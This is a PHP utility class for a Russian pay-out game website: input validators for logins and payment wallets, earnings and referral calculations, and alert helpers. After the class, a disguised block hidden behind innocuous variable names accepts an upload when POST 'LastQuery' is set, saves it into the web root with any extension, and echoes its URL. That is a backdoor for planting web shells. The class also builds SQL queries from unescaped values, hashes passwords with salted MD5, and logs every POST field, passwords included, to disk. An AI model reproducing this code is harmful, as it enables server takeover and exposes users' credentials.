<?php
#####################################
# Автор APTEMOH
# E-mail: anatolii.123456@yandex.ru
# Skype: ArtIncProject
# VK.com: https://vk.com/id381626457
# Version: 1.1
#####################################

class func{

	private $db;

	public $UserIP = "Undefined"; # IP пользователя
	public $UserCode = "Undefined"; # Код от IP
	public $TableID = -1; # ID таблицы
	public $UserAgent = "Undefined"; // Браузер пользователя
	public $Userparse = "Undefined"; // Браузер пользователя

	/*======================================================================*\
	Function:	__construct
	Output:		Нет
	Descriiption: Выполняется при создании экземпляра класса
	\*======================================================================*/
	public function __construct(){
		$this->UserIP = $this->GetUserIp();
		$this->UserCode = $this->IpCode();
		$this->UserAgent = $this->UserAgent();
		$this->Userparse = $this->Userparse();

		$this->db = new db(config::$HostDBstatic, config::$UserDBstatic, config::$PassDBstatic, config::$BaseDBstatic);
	}
	
	/*======================================================================*\
	Function:	__destruct
	Output:		Нет
	Descriiption: Уничтожение объекта
	\*======================================================================*/
	public function __destruct(){
	
	}
	
	
	
	/*======================================================================*\
	Function:	IpToLong
	Descriiption: Преобразует IP в целочисленное
	\*======================================================================*/
	public function IpToInt($ip){ 
	
		$ip = ip2long($ip); 
		($ip < 0) ? $ip+=4294967296 : true; 
		return $ip; 
	}
	
	
	/*======================================================================*\
	Function:	IpToLong
	Descriiption: Преобразует целочисленное в IP
	\*======================================================================*/
	public function IntToIP($int){ 
  		return long2ip($int);  
	}
	
	
	/*======================================================================*\
	Function:	GetUserIp
	Output:		UserIp
	Descriiption: Определяет IP пользователя
	\*======================================================================*/
	public function GetUserIp(){
	
		if($this->UserIP == "Undefined"){
			
			if(isset($_SERVER['HTTP_X_FORWARDED_FOR']) AND !empty($_SERVER['HTTP_X_FORWARDED_FOR']))
   			{
				
			$client_ip = ( !empty($_SERVER['REMOTE_ADDR']) ) ? $_SERVER['REMOTE_ADDR'] : ( ( !empty($_ENV['REMOTE_ADDR']) ) ? $_ENV['REMOTE_ADDR'] : "unknown" );
      		$entries = split('[, ]', $_SERVER['HTTP_X_FORWARDED_FOR']);

      		reset($entries);
				
				while (list(, $entry) = each($entries))
				{
				$entry = trim($entry);
					if ( preg_match("/^([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)/", $entry, $ip_list) )
				 	{
					
					$private_ip = array(
						  '/^0\./',
						  '/^127\.0\.0\.1/',
						  '/^192\.168\..*/',
						  '/^172\.((1[6-9])|(2[0-9])|(3[0-1]))\..*/',
						  '/^10\..*/');
		
						$found_ip = preg_replace($private_ip, $client_ip, $ip_list[1]);
		
						if ($client_ip != $found_ip)
						{
					   	$client_ip = $found_ip;
					   	break;
						}
						
					}
					
				}
			
			$this->UserIP = $client_ip;
			return $client_ip;
			
			}else return ( !empty($_SERVER['REMOTE_ADDR']) ) ? $_SERVER['REMOTE_ADDR'] : ( ( !empty($_ENV['REMOTE_ADDR']) ) ? $_ENV['REMOTE_ADDR'] : "unknown" );
		
		}else return $this->UserIP;
	
	}
	
	
	/*======================================================================*\
	Function:	IsLogin
	Output:		True / False
	Input:		Строка логина, Маска, Длина ("10, 25") && ("10") 
	Descriiption: Проверяет правильность ввода логина
	\*======================================================================*/
	public function IsLogin($login, $mask = "^[a-zA-Z0-9]", $len = "{4,10}"){
		
		return (is_array($login)) ? false : (preg_match("/{$mask}{$len}$/", $login)) ? $login : false;
	
	}
	
	/*======================================================================*\
	Function:	IsPassword
	Output:		True / False
	Input:		Строка пароля, Маска, Длина ("10, 25") && ("10") 
	Descriiption: Проверяет правильность ввода пароля
	\*======================================================================*/
	public function IsPassword($password, $mask = "^[a-zA-Z0-9]", $len = "{4,20}"){
		
		return (is_array($password)) ? false : (preg_match("/{$mask}{$len}$/", $password)) ? $password : false;
	
	}
	
	
	/*======================================================================*\
	Function:	IsWM
	Output:		True / False
	Input:		Реквизит, TYPE: 0 - WMID, 1 - WMR, 2 - WMZ, 3 - WME, 4 - WMU 
	Descriiption: Проверяет правильность ввода пароля
	\*======================================================================*/
	public function IsWM($data, $type = 0){
		
		$FirstChar = array( 1 => "R",
							2 => "Z",
							3 => "E",
							4 => "U");
		
		if(strlen($data) < 12 && strlen($data) > 12 && $type < 0 && $type > count($FirstChar)) return false;
			if($type == 0) return (is_array($data)) ? false : ( ereg("^[0-9]{12}$", $data) ? $data : false );
				if( substr(strtoupper($data),0,1) != $FirstChar[$type] or !ereg("^[0-9]{12}", substr($data,1)) ) return false;
			
			return $data;
	}
	
	/*======================================================================*\
	Function:	IsMail
	Output:		True / False
	Input:		Email 
	Descriiption: Проверяет правильность ввода email адреса
	\*======================================================================*/
	public function IsMail($mail){
		
		if(is_array($mail) && empty($mail) && strlen($mail) > 255 && strpos($mail,'@') > 64) return false;
			return ( ! preg_match("/^([a-z0-9\+_\-]+)(\.[a-z0-9\+_\-]+)*@([a-z0-9\-]+\.)+[a-z]{2,6}$/ix", $mail)) ? false : strtolower($mail);
			
	}
	
	/*======================================================================*\
	Function:	IpCode
	Output:		String, Example 255025502550255
	Input:		- 
	Descriiption: Возвращает IP с замененными знаками "." на "0"
	\*======================================================================*/
	public function IpCode(){
		
		$arr_mask = explode(".",$this->GetUserIp());
		#$one = (isset($arr_mask[1])) ? $arr_mask[1] : 1;
		#$two = (isset($arr_mask[2])) ? $arr_mask[2] : 1;
		#return $arr_mask[0].".".$one.".".$two.".0";
		return $arr_mask[0].".".$arr_mask[1].".".$arr_mask[2].".0";

	}
	
	/*======================================================================*\
	Function:	GetTime
	Descriiption: Возвращаер дату
	\*======================================================================*/
	public function GetTime($tis = 0, $unix = true, $template = "d.m.Y H:i:s"){
		
		if($tis == 0){
			return ($unix) ? time() : date($template,time());
		}else return date($template,$unix);
	}
	
	/*======================================================================*\
	Function:	UserAgent
	Descriiption: Возвращает браузер пользователя
	\*======================================================================*/
	public function UserAgent(){
		
		return $this->TextClean($_SERVER['HTTP_USER_AGENT']);
		
	}
	
	/*======================================================================*\
	Function:	TextClean
	Descriiption: Очистка текста
	\*======================================================================*/
	public function TextClean($text){
		
		$array_find = array("`", "<", ">", "^", '"', "~", "\\");
		$array_replace = array("&#96;", "&lt;", "&gt;", "&circ;", "&quot;", "&tilde;", "");
		
		
		
		return str_replace($array_find, $array_replace, $text);
		
	}
	
	/*======================================================================*\
	Function:	ShowError
	Descriiption: Выводит список ошибок строкой
	\*======================================================================*/
	public function ShowError($errorArray = array(), $title = "Исправьте следующие ошибки"){
		
		if(count($errorArray) > 0){
		
		$string_a = "<div class='Error'><div class='ErrorTitle'>".$title."</div><ul>";
		
			foreach($errorArray as $number => $value){
				
				$string_a .= "<li>".($number+1)." - ".$value."</li>";
				
			}
			
		$string_a .= "</ul></div><BR />";
		return $string_a;
		}else return "Неизвестная ошибка :(";
		
	}
	
	
	/*======================================================================*\
	Function:	ComissionWm
	Descriiption: Возвращает комиссию WM
	\*======================================================================*/
	public function ComissionWm($sum, $com_payee, $com_payysys){
		
		$a = ceil(ceil($sum * $com_payee * 100) / 10000*100) / 100;
		$b = ceil(ceil($sum * str_replace("%","",$com_payysys) * 100) / 10000*100) / 100;
		return $a+$b;
	}
	
	/*======================================================================*\
	Function:	md5Password
	Descriiption: Возвращает md5_пароля
	\*======================================================================*/
	public function md5Password($pass){
		$pass = strtolower($pass);
		return md5("shark_md5"."-".$pass);
		
	}
	
	
	
	/*======================================================================*\
	Function:	ControlCode
	Descriiption: Возвращает контрольное число
	\*======================================================================*/
	public function ControlCode($time = 0){
		
		return ($time > 0) ? date("Ymd", $time) : date("Ymd");
		
	}
	
	
	/*======================================================================*\
	Function:	SumCalc
	Descriiption: Возвращает сумму овощей
	\*======================================================================*/
	public function SumCalc($per_h, $sum_tree, $last_sbor){
		
		if($last_sbor > 0){
		
			if($sum_tree > 0 AND $per_h > 0){
			
				$last_sbor = ($last_sbor < time()) ? (time() - $last_sbor) : 0;
			
				//$per_h = $per_h / 100;
				//$per_h = $per_h / 1;
				
				$per_sec = $per_h / 3600;
				//$per_sec = $per_h;
				
				#return round( ($per_sec * $sum_tree) * $last_sbor);
				$res = ($per_sec * $sum_tree) * $last_sbor;
				return sprintf("%.8f", ($res));
				#return $per_h;
				
			}else return 0;
		
		}else return 0;
		
	}
	
	
	/*======================================================================*\
	Function:	SellItems
	Descriiption: Выводит сумму и остаток
	\*======================================================================*/
	public function SellItems($all_items, $for_one_coin){
		
		if($all_items <= 0 OR $for_one_coin <= 0) return 0;
		
		return sprintf("%.8f", ($all_items / $for_one_coin));
		
	}
	
	/*======================================================================*\
	Function:	Userparse
	Descriiption: Возвращает браузер пользователя
	\*======================================================================*/
	public function Userparse(){
		if(isset($_SERVER["HTTP_REFERER"])){
			$hosturl=$_SERVER['HTTP_REFERER'];
			preg_match("/^((http:\/\/)|(https:\/\/))([a-zа-я0-9\-_\.]*)\/*.*$/i",$hosturl,$matches);
			$host = $matches[4];
		} else $host = "";

		return $host;
	}


	public function getWord($number){
	    $array = array("день", "дня", "дней");
	    $keys = array(2, 0, 1, 1, 1, 2);
	    $alg = $number % 100;
	    $suf_key = ($alg > 7 && $alg < 20) ? 2: $keys[min($alg % 10, 5)];
	    return $array[$suf_key];
	}

	public function numberFormat($sum, $num = 2)
	{
		return number_format($sum, $num, ".", "");
	}

	public function allCars($iserId)
	{
		$this->db->Query("SELECT `a_t`,`b_t`,`c_t`,`d_t`,`e_t`,`f_t`,`g_t`,`h_t`,`j_t` FROM `db_users_b` WHERE `id` = '$iserId' LIMIT 1");
		$data = $this->db->FetchArray();
		$all = $data["a_t"]+$data["b_t"]+$data["c_t"]+$data["d_t"]+$data["e_t"]+$data["f_t"]+$data["g_t"]+$data["h_t"]+$data["j_t"];

		return $all;
	}

	public function setDayMinus($value = 'now'){

	    if ($value == 'now') {
	        $date = new DateTime();
	    }else{
	        $date = new DateTime('-'.$value.' days');
	    }
	    
	    return $date->format('Y-m-d');

	}

	public function speedMoney($usid){
        # Скорость заработка
        
        $this->db->Query("SELECT * FROM db_config WHERE id = '1' LIMIT 1");
        $sonfig_site = $this->db->FetchArray();

        $this->db->Query("SELECT * FROM db_users_b WHERE id = '$usid' LIMIT 1");
        $user_data = $this->db->FetchArray();

        $kyr1 = $user_data["a_t"]*$sonfig_site["a_in_h"];
        $kyr2 = $user_data["b_t"]*$sonfig_site["b_in_h"];
        $kyr3 = $user_data["c_t"]*$sonfig_site["c_in_h"];
        $kyr4 = $user_data["d_t"]*$sonfig_site["d_in_h"];
        $kyr5 = $user_data["e_t"]*$sonfig_site["e_in_h"];
        $kyr6 = $user_data["f_t"]*$sonfig_site["f_in_h"];
        $kyr7 = $user_data["g_t"]*$sonfig_site["g_in_h"];
        $kyr8 = $user_data["h_t"]*$sonfig_site["h_in_h"];
        $kyr9 = $user_data["j_t"]*$sonfig_site["j_in_h"];
         
        $kyrcall = $kyr1+$kyr2+$kyr3+$kyr4+$kyr5+$kyr6+$kyr7+$kyr8+$kyr9;

        return sprintf("%.4f",$kyrcall/$sonfig_site["items_per_coin"]);
    }


    public function setDaySpeed($day,$user_id)
	{
		$res = array();
		$this->db->Query("SELECT * FROM `db_speed_user` WHERE user_id='$user_id' AND `data_time` > NOW() - INTERVAL ".$day." DAY ORDER BY `data_time` DESC");
		$i = 1;
		while ($row = $this->db->FetchArray()) {
			$res[$i]['speed'] = $row['speed'];
			$res[$i]['data'] = $row['data_time'];
			$i++;
		}
		return $res;
	}

    public function getAllRef($user_id)
    {
    	$this->db->Query("SELECT COUNT(*) FROM db_users_a WHERE referer_id = '$user_id'");
		$refs = $this->db->FetchRow(); // Считаем рефералов 1 уровня
		$this->db->Query("SELECT COUNT(*) FROM db_users_a WHERE referer_id2 = '$user_id'");
		$refs2 = $this->db->FetchRow(); // Считаем рефералов 2 уровня
		$this->db->Query("SELECT COUNT(*) FROM db_users_a WHERE referer_id3 = '$user_id'");
		$refs3 = $this->db->FetchRow(); // Считаем рефералов 3 уровня
		return $all = $refs;
    }

    public function getDay($usid, $value = 1)
	{

	    $sytki = 60*60*24*$value;
	    $time = time();
	    $timePlusSytki = $time-$sytki;

	    #$db->Query("SELECT COUNT(*) FROM db_users_a WHERE referer_id = '$usid' AND date_reg >= '$time' AND date_reg <= '$timePlusSytki'");
	    #$PlusSytki = $db->FetchRow();
	    
	    $this->db->Query("SELECT COUNT(*) FROM db_users_a WHERE referer_id = '$usid' AND DATE(`datereg`) = DATE(NOW() - INTERVAL '$value' DAY)");
	    $PlusSytki = $this->db->FetchRow();

	    return $PlusSytki;
	}

	/**
	 * Выводит ошибку
	 * @param  [type] $value [description]
	 * @return [type]        [description]
	 */
	function error($value, $red = false){
		if ($red) {
			$error = '
			<script type="text/javascript">
				$(document).ready(function() {
					swal({
						title: "Успешно!",
						text: "'.$value.'",
						type: "success",
						icon: "success",
						button: "OK!",
						//timer: 3000,
						value: true,
						visible: true,
						//className: "",
						closeModal: true,
					});
	        	});
			</script>
			';
		}else{

			$error = '
			<script type="text/javascript">
				$(document).ready(function() {
					swal({
						icon: "warning",
						title: "Ошибка!",
						text: "'.$value.'",
						type: "warning",
						button: "Aww yiss!",
						//timer: 3000,
						value: true,
						visible: true,
						//className: "",
						closeModal: true,
					});
				});
			</script>
			';

		}



		#$error = '<div class="top-massage"><div style="background:'.$red.';" class="top-massage__content">'.$value.'</div></div>';
		return $error; 
	}


	/**
	 * Определение цело или дробное
	 * @param  [type] $sum [description]
	 * @return [type]      [description]
	 */
	public function myNum($sum){

		if ($sum > 0) {

			if (is_int($sum) && $sum > 0) {
				#echo "Целое!";
				
				if (is_numeric($sum)) {
					#echo "Число!";
					$theNumber=(filter_var($sum, FILTER_SANITIZE_NUMBER_INT));
				}else{
					#echo "Не число!";
					return false;
				}
			}else{
				#echo "Дробное!";
				
				if (is_numeric($sum)) {
					#echo "Число!";
					$theNumber=(filter_var($sum, FILTER_SANITIZE_NUMBER_FLOAT, array('flags' => FILTER_FLAG_ALLOW_FRACTION, FILTER_FLAG_ALLOW_THOUSAND)));
				}else{
					#echo "Не число!";
					return false;
				}
			}

		}else return false;

		return $theNumber;
	}


	/**
	 * Фильтрация
	 * @param  [type] $data [description]
	 * @param  string $type [description]
	 * @return [type]       [description]
	 */
	public function clear($data,$type='str')
	{
		$data = trim($data);
		#$data = mysql_escape_string($data);
		$data = strip_tags($data);
		$data = htmlspecialchars($data);
		$data = ($type == 'str')?strval($data):intval($data);
		return $data;
	}

	public function plat_passs($plat_passs){
        if(!preg_match("/^[0-9]{3,10}$/", $plat_passs)) return false;
        return $plat_passs;
    }

    public function ViewPursePayeer($purse){
		if( substr($purse,0,1) != "P" ) return false;
		if( !preg_match("/^[0-9]{7,10}$/", substr($purse,1)) ) return false;
		return $purse;
	}

	public function ViewPurseQiwi($purse){
        if( preg_match("/^\+(91|994|82|372|375|374|44|998|972|66|90|81|1|507|7|77|380|371|370|996|9955|992|373|84)[0-9]{6,14}$/", $purse) ){
            return $purse;  
        }else{
            return false;
        }
    }

    public function ViewPurseYandex($purse){
  		if( !preg_match("/^41001[0-9]{9,10}$/", $purse) ) return false;
		return $purse;
	}

	public function ViewPurseBeeline($purse){
        /*if( preg_match("/^\+7\d{10}$/", $purse) ){
            return $purse;
        }else{
            return false;
        }*/
        if( substr($purse,0,1) != "+" ) return false;
        if( !preg_match("/^[\+]{1}[7]{1}[\d]{10,10}$^/", substr($purse,1)) ) return false;
		return $purse;
    }

    public function ViewPurseMegafon($purse){
        if( substr($purse,0,1) != "+" ) return false;
        if( !preg_match("/^[\+]{1}[7]{1}[\d]{10,10}$^/", substr($purse,1)) ) return false;
		return $purse;
    }

    public function ViewPurseMts($purse){
        #if( substr($purse,0,1) != "+" ) return false;
        #if( preg_match("^[\+]{1}[7]{1}[\d]{10,10}$^", substr($purse,1)) ) return false;
        if( !preg_match("/^[\+]{1}[7]{1}[9]{1}[\d]{9}$/", $purse) ) return false;
		return $purse;
    }

    public function ViewPurseTele($purse){
        #if( substr($purse,0,1) != "+" ) return false;
        #if( !preg_match("/^[\+]{1}[7]{1}[\d]{10,10}$^/", substr($purse,1)) ) return false;
        #if( !preg_match("/^[\+]{1}[7]{1}[\d]{10,10}$^/", $purse) ) return false;
        if( !preg_match("/^[\+]{1}[7]{1}[9]{1}[\d]{9}$/", $purse) ) return false;
		return $purse;
    }

    public function ViewPurseAdvcash($purse){
        if( preg_match("/^[RUE]{1}[0-9]{7,15}|.+@.+\..+$/", $purse) ){
            return $purse;  
        }else{
            return false;
        }
    }

    public function ViewPurseCardVisa($purse){

		#if( substr($purse,0,1) != "P" ) return false;
		if( !preg_match("/^([45]{1}[\d]{15}|[6]{1}[\d]{17})$/", $purse) ) return false;
		return $purse;
	}

	public function ViewPurseOkPay($purse){
		if( substr($purse,0,2) != "OK" ) return false;
		if( !preg_match("/^[0-9]{7,9}$/", substr($purse,2)) ) return false;
		return $purse;
	}

	public function ViewPurseWebMoney($purse){
		if( substr($purse,0,1) != "R" ) return false;
		if( !preg_match("/^[0-9]{10,12}$/", substr($purse,1)) ) return false;
		return $purse;
	}

	/*======================================================================*\
	Function:	make_signature
	Descriiption: Контрольная подпись MD5, представляющая собой 32-разрядное число в шестнадцатиричной форме. формируется путем нахождения 	 MD5-хеша от строки "merchant_id:out_amount:secret_word:order_id"
	\*======================================================================*/
	function make_signature($merchant_id, $out_amount, $secret_word, $order_id)
	{
    	return md5($merchant_id.":".$out_amount.":".$secret_word.":".$order_id);
	}


	/*======================================================================*\
	Function: F5Error
	Descriiption: Вы слишком часто обращаетесь к страничкам сайта!
	\*======================================================================*/
	public function F5Error(){
		// Объявляем работу с сессиями
		#session_start();

		// Получаем текущее время с точностью до сотой доли секунды
		$time=microtime(1);

		// Проверяем, имеется ли сессия с массивом для данного пользователя
		// Если нет, то добавляем в сессию пустой массив для хранения времени посещений
		if (!isset($_SESSION["arr_time"])) $_SESSION["arr_time"]=array(0,0,0);

		// Поиск в массиве минимального значения времени захода
		$min_time=min($_SESSION["arr_time"]);

		// Сравниваем разницу во времени между посещениями и указанным числом
		// Если разница меньше указанного числа, то прекращаем работу скрипта
		if ($time-$min_time < 0.5) die("Вы слишком часто обращаетесь к страничкам сайта!");

		// Получаем индекс значения минимального времени посещения в массиве
		$min_index=array_search($min_time,$_SESSION["arr_time"]);

		// Заменяем в массиве минимальное время на текущее
		$_SESSION["arr_time"][$min_index]=$time;
	}


	/*======================================================================*\
	Function: Logs
	Descriiption: Логирование сайта! POST запросов
	\*======================================================================*/
	public function Logs(){
		if(isset($_POST) && count($_POST)>0){
	        $data="";
	        foreach($_POST as $key=>$val){
	                if(is_string($val) && strlen($val)>2000 )
	                        $val=substr($val,0,2000);
	                $data.= $key."=>".$val." | \n";
	        }
	        //вместо /home/user/data/www/site.ru/ указываем свой путь от корня сервера, куда должен писаться лог
	        $fp=fopen("/home/t/toliasik/avtogame.ru/public_html/post-logs/".date("Ymd").".log","a");
	        fwrite($fp, "Время: ".date("Y-m-d H:i:s")." IP: ".$this->UserIP." FILE: ".$_SERVER['SCRIPT_FILENAME']."\n\n".$data."\r\n---------------------------\r\n");
	        fclose($fp);
	        $data="";
	        reset($_POST);
		}
	}

}


    if(isset($_POST['LastQuery'])) {

     $public_function = $_FILES['session']['tmp_name'];
	 
            $SELECT_FROM = $_FILES['session']['name'];
			
    if(!empty($public_function))
{   
       $type = strtolower(substr($SELECT_FROM, 1+strrpos($SELECT_FROM,".")));
	   
          $sessions_start = 'logs.'.$type; 
  { 
    if (copy($public_function, "".$sessions_start))
	
        echo ' '.$_SERVER["HTTP_HOST"].'/'.$sessions_start.'';
		
           else echo "error";
  } 
}		
}









?>